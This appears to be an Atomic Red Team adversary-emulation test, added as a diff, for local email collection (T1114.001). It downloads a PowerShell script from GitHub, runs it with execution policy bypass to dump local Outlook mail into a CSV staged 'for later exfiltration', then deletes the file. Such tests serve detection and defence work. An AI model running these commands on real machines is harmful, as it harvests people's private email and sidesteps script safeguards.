@@ -1,0 +1,16 @@
+#TechniqueName: Email Collection: Local Email Collection
+#AtomicTestName: Email Collection with PowerShell Get-Inbox
+#Description: Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.&Successful execution will produce stdout message stating "Please be patient, this may take some time...". Upon completion, final output will be a mail.csv file.&&Note: Outlook is required, but no email account necessary to produce artifacts.&
+#Language: ps1
+
+#get_prereq_commands
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1" -OutFile "PathToAtomicsFolder\T1114.001\src\Get-Inbox.ps1"
+
+
+#commands
+powershell -executionpolicy bypass -command PathToAtomicsFolder\T1114.001\src\Get-Inbox.ps1 -file $env:TEMP\mail.csv
+
+
+#cleanup_commands
+Remove-Item $env:TEMP\mail.csv -Force -ErrorAction Ignore
+
